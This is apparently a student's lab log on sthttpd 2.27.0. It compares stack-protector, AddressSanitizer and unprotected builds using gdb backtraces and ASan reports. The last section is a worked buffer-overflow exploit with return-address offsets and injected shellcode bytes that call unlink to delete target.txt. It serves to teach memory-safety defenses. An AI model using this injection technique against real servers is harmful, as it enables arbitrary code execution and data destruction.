@@ -1,0 +1,273 @@
+//first download the file from lab instruction sthttpd 2.27.0
+//then do the patch
+
+//do the command './configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"'
+
+//complie thttpd-sp
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+
+//complie thttpd-as
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+
+//complie thttpd-no
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+//I computed the port for myself for thttpd-sp
+(12330 + 3 * (504502689 % 293) + 1 = 12490
+so thttpd-as will be 12491, thttpd-no will be 12492
+
+I run the thttpd-sp -p 12490 -D and opened up another terminal window
+and test the program is running ok with curl http://localhost:12490/foo.txt
+
+//I run the gdb thttpd-sp with arguments -C config.txt
+//to make the thttpd-sp crash, we know that we had a buffer with side 100
+//which is the line[100], and we use fgets to write 1000 char into this buffer.
+//so we can make the crash by sending 1000 char into the buffer, so the stack will
+//overflow.
+//the following is the backtrace of the thttpd-sp when it crashed.
+//from the backtrace we can see that in thttpd.c line 1190 which is the line 
+//when read_config returns
+//I stepinto the instruction and I see there is an instruction says
+//0x00000000004024b0 in __stack_chk_fail@plt ()
+//and this shows that the stack protection is working and check that there is 
+//stack overflow, therefore terminated the program.
+*** stack smashing detected ***: /w/home.06/ee/xiongfen/Desktop/sthttpd-2.27.0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
+(gdb) bt
+#0  0x00007ffff6db1128 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db2029 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e50a6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7650e24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e8a57 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e8a20 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405042 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x6161616161616161 in ?? ()
+#10 0x6161616161616161 in ?? ()
+#11 0x6161616161616161 in ?? ()
+#12 0x6161616161616161 in ?? ()
+#13 0x6161616161616161 in ?? ()
+#14 0x6161616161616161 in ?? ()
+#15 0x0000000000400061 in ?? ()
+#16 0x0000000000000000 in ?? ()
+
+
+//I run the gdb thttpd-as with arguments -C config.txt
+//to make the thttpd-as crash, we do the same thing as we did for thttpd-sp
+//the following is the backtrace when thttpd-as crash.
+//from the Sanitizer report we can see that we read 218 size char into the buffer
+//and the function caused the crash is __interceptor_strchr
+==34608==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcf04 at pc 0x00000045a418 bp 0x7fffffffce60 sp 0x7fffffffc610
+READ of size 218 at 0x7fffffffcf04 thread T0
+    #0 0x45a417 in __interceptor_strchr ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
+    #1 0x4b1e00 in read_config /u/ee/ugrad/xiongfen/Desktop/sthttpd-2.27.0/src/thttpd.c:1018
+    #2 0x4b0060 in read_line_program ../../../../gcc-5.2.0/libsanitizer/libbacktrace/../../libbacktrace/dwarf.c:1863
+    #3 0x4b0060 in read_line_info ../../../../gcc-5.2.0/libsanitizer/libbacktrace/../../libbacktrace/dwarf.c:1991
+    #4 0x4b0060 in dwarf_lookup_pc ../../../../gcc-5.2.0/libsanitizer/libbacktrace/../../libbacktrace/dwarf.c:2704
+
+Address 0x7fffffffcf04 is located in stack of thread T0 at offset 132 in frame
+    #0 0x4b1d4f in read_config /u/ee/ugrad/xiongfen/Desktop/sthttpd-2.27.0/src/thttpd.c:1000
+
+  This frame has 1 object(s):
+    [32, 132) 'line' <== Memory access at offset 132 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430 __interceptor_strchr
+Shadow bytes around the buggy address:
+  0x10007fff7990: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff79d0: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x10007fff79e0:[04]f4 f4 f4 f3 f3 f3 f3 00 00 00 00 00 00 00 00
+  0x10007fff79f0: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 04 f4 f4 f4
+  0x10007fff7a00: f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 00 f4 f4
+  0x10007fff7a10: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
+  0x10007fff7a20: 00 00 00 00 f2 f2 f2 f2 00 00 00 00 00 00 00 00
+  0x10007fff7a30: 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+==34608==ABORTING
+[Inferior 1 (process 34608) exited with code 01]
+
+//and when I check the instruction in the thttpd-as I find that the Sanitizer
+//first check for Unpoisoned Region and then determined that the stack region
+//we overflowed was poisoned, so it crashs the program and terminates the
+//program
+__asan::QuickCheckForUnpoisonedRegion (size=218, beg=140737488342688) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:27
+27      in ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc
+(gdb)
+28      in ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc
+(gdb)
+0x000000000045a3db      28      in ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc
+(gdb)
+__interceptor_strchr (str=str@entry=0x7fffffffcea0 "port=", 'a' <repeats 195 times>..., c=c@entry=35) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc:430
+430     in ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc
+(gdb)
+0x000000000045a3ff      430     in ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc
+(gdb)
+0x000000000045a402      430     in ../../../../gcc-5.2.0/libsanitizer/asan/asan_interceptors.cc
+(gdb)
+__asan_region_is_poisoned (beg=beg@entry=140737488342688, size=size@entry=218) at ../../../../gcc-5.2.0/libsanitizer/asan/asan_poisoning.cc:173
+173     ../../../../gcc-5.2.0/libsanitizer/asan/asan_poisoning.cc: No such file or directory.
+
+
+//I run the gdb thttpd-no with arguments -C config.txt
+//to make the thttpd-no crash, we do the same thing as we did for thttpd-sp
+//the thttpd-no does not invok advanced stack protection machanism, the program
+//crashed because we overwrite the return address of the read_config call
+//so that the flow of program messed up and instruction pointer points to 
+//somewhere in the memory where the content of the memory is not instruction
+//the following is the backtrack of the thttpd-no crashing
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190
+1190        }
+(gdb) bt
+#0  0x0000000000404d8b in read_config (filename=<optimized out>) at thttpd.c:1190
+#1  0x6161616161616161 in ?? ()
+#2  0x6161616161616161 in ?? ()
+#3  0x6161616161616161 in ?? ()
+#4  0x6161616161616161 in ?? ()
+#5  0x6161616161616161 in ?? ()
+#6  0x6161616161616161 in ?? ()
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x0000000000400061 in ?? ()
+#10 0x0000000000000000 in ?? ()
+
+
+//get thttpd-sp assembly code 
+make clean
+make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd.o src/thttpd-sp.s
+
+//get thttpd-as assembly code 
+make clean
+make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd.o src/thttpd-as.s
+
+//get thttpd-no assembly code 
+make clean
+make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd.o src/thttpd-no.s
+
+//the assembly-language files' implementations of the handle_read function
+//are very similar between thttpd-sp.s and thttpd-no.s, and thttpd-as.s is the 
+//longest one in all of the three.
+//the thttpd-as use Canary to protect the stack so it insert an value above the array buffer
+//and when the array buffer overflows, the Canary value will be changed, therefore detect the
+//overflow in stack.
+//the thttpd-as use Sanitizer that check memory allocated from stack or heap to see if there is 
+//any overflow on the memory. the way Sanitizer checks the memory is that it maps every 8 byte array buffer to
+//1 byte of memory at an specific location and if we overwrite the memory that we should not be touching, then
+//the Sanitizer will report this array buffer region is poisoned, therefore it protects the memory being overflowed.
+
+
+//to attack the program cause the target.txt to be deleted, we need first know that how stack is layed out,
+//the rsp register is pointing at the bottom of the stack when the function start, and it is pointing the
+//return address of the read_config function. from the assembly code we know that the space between the 
+//line buffer and the return address is 40+112=152 byte, so we need to fill 152 byte stuff into the line
+//buffer and then overwrite the 8 byte return address that we want the instruction pointer points to when
+//the function returns.
+//an good return address that we want to insert will be the address of line buffer offset by 16 byte, which is 
+//the length of "port=target.txt" string plus one null character. we can insert assembly code instruction when
+//the fgets called in the read_config function and we know this region of memory will not be modified even after
+//the read_config function returns. so we convert "port=target.txt\0" and assembly hex code into raw data and
+//write some junk the push the length to 152 byte, then we append the return address that I find in in the gdb
+
+the assembly code that I inject are follows:
+0:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+7:   48 8d bc 24 65 ff ff    lea    -0x9b(%rsp),%rdi
+e:   ff
+f:   0f 05                   syscall
+
+//since we are using syscall to call the system function unlink, we want to move 87(hex 0x57) into %rax
+//so the first instruction is "mov    $0x57,%rax"
+//the second instuction is "lea    -0x9b(%rsp),%rdi", we know that 0x9b equals 155 in decimal, but why
+//we subtract 155 from rsp? because we want to pass the "target.txt" string to the unlink call and the
+//"target.txt" is 155 byte under the %rsp. the reason it 155 byte under is because when the 
+//instruction pointer gets return address from %rsp, the %rsp will increment by 8 byte. So the %rsp is
+//actually 160 byte away from line buffer, and we add 5 byte to skip "port=" string to get the address
+//of "target.txt" string therefore we subtract total 155 byte from %rsp.
+//the third instruction is syscall, which will call the system function based on the value in %rax,
+//in this case, the syscall will call unlink to delete "target.txt"
+
+//the above assembly code I wrote is from objdump which include the hex representation of instructions
+//I pick these hex number and convert them into raw data and along with other data write it into the 
+//config.txt, which I will pass into the thttpd-no with -C argument.
+
+____________________________
+|      return address      | 
+|__________________________|<-%rsp point to here when function start,
+|                          |the address is 0x7FFFFFFFD098
+|                          |
+|                          |
+|                          |
+|      5 pushes            |  40 byte 
+|                          |
+|                          |
+|                          |
+|                          |
+|__________________________|<-----------0x7FFFFFFFD070
+|                          |
+|                          |
+|                          |
+|                          |
+|                          |
+|                          |
+|                          |
+|    junk stuff here       |  112 byte (from sub 0x70,%rsp)
+|                          |
+|                          |
+|                          |
+|                          |
+|                          |
+|                          |
+|                          |
+|<assembly code injection> |<-assembly start at address 0x7FFFFFFFD010
+|port=target.txt           |<-line start here 0x7FFFFFFFD000
+
+
+//below is console print out the code when we run the gdb ./thttpd-no
+//and I use set args -C config.txt to set the argument for this run
+//and I set the break point at 1190, which is the list line of the read_config
+//then I type si until the following shows up, and type x/4i 0x00007fffffffd010 to
+//detemine if the instruction, that I wrote, load correctly
+0x00007fffffffd010 in ?? ()
+(gdb) x/4i 0x00007fffffffd010
+=> 0x7fffffffd010:      mov    $0x57,%rax
+   0x7fffffffd017:      lea    -0x9b(%rsp),%rdi
+   0x7fffffffd01f:      syscall
+   0x7fffffffd021:      (bad)
+(gdb)
+
+//and at the end, I successfully deleted the target.txt file.
